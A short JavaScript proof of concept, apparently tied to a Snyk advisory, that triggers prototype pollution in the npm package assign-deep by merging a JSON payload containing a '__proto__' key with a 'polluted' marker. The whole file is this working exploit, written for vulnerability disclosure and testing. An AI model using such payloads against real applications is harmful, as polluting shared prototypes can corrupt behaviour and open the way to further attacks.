//https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
 
  const assign = require("assign-deep");
  const payloads = ['{"__proto__": {"polluted": "yes"}}'];

  var obj = {};

   

  assign({}, JSON.parse(payloads[0]));
// End of file
